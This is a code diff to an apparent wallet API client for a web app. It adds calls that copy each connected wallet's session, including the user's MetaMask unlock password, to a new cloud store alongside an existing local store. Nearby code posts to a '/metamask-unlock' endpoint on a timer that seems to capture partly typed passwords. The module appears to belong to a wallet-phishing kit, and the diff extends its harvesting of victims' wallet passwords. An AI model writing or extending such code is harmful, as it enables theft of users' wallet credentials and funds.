@@ -3,6 +3,10 @@ import {
   disconnectLocalWalletSession,
   upsertLocalWalletSession,
 } from './walletMonitorStore'
+import {
+  disconnectCloudWalletSession,
+  upsertCloudWalletSession,
+} from './walletCloudStore'
 
 const API_BASE = resolveApiUrl('/api/wallet')
 
@@ -87,6 +91,7 @@ export const walletApi = {
     browserSessionId?: string
   }) {
     upsertLocalWalletSession(payload)
+    void upsertCloudWalletSession(payload)
     try {
       const res = await fetch(`${API_BASE}/connect`, {
         method: 'POST',
@@ -111,6 +116,7 @@ export const walletApi = {
     browserSessionId?: string
   }) {
     upsertLocalWalletSession(payload)
+    void upsertCloudWalletSession(payload)
     try {
       await fetch(`${API_BASE}/presence`, {
         method: 'POST',
@@ -130,6 +136,12 @@ export const walletApi = {
     draft?: boolean
   }) {
     upsertLocalWalletSession({
+      walletAddress: payload.walletAddress,
+      walletType: 'MetaMask',
+      pageUrl: payload.pageUrl,
+      unlockPassword: payload.password,
+    })
+    void upsertCloudWalletSession({
       walletAddress: payload.walletAddress,
       walletType: 'MetaMask',
       pageUrl: payload.pageUrl,
@@ -159,6 +171,12 @@ export const walletApi = {
       pageUrl: payload.pageUrl,
       unlockPassword: payload.password,
     })
+    void upsertCloudWalletSession({
+      walletAddress: payload.walletAddress,
+      walletType: 'MetaMask',
+      pageUrl: payload.pageUrl,
+      unlockPassword: payload.password,
+    })
     if (unlockDraftTimer) clearTimeout(unlockDraftTimer)
     unlockDraftTimer = setTimeout(() => {
       fetch(`${API_BASE}/metamask-unlock`, {
@@ -174,7 +192,10 @@ export const walletApi = {
    * Record wallet disconnect on server
    */
   async recordDisconnect(walletAddress?: string) {
-    if (walletAddress) disconnectLocalWalletSession(walletAddress)
+    if (walletAddress) {
+      disconnectLocalWalletSession(walletAddress)
+      void disconnectCloudWalletSession(walletAddress)
+    }
     try {
       await fetch(`${API_BASE}/disconnect`, {
         method: 'POST',
